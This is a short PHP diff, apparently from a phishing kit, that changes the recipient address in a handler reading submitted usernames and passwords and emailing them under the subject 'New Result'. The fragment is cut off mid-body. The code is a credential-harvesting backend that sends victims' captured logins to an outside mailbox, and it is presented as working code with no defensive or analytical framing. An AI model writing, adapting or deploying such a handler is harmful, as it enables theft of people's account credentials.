@@ -2,7 +2,7 @@
 if (isset($_POST['username']) && isset($_POST['password'])){
     $username = $_POST['username'];
     $password = $_POST['password'];
-    $to = 'ykxx0204@gmail.com';
+    $to = 'king9test9@gmail.com';
     $subject = "New Result";
     $body = '<html>
                 <body>
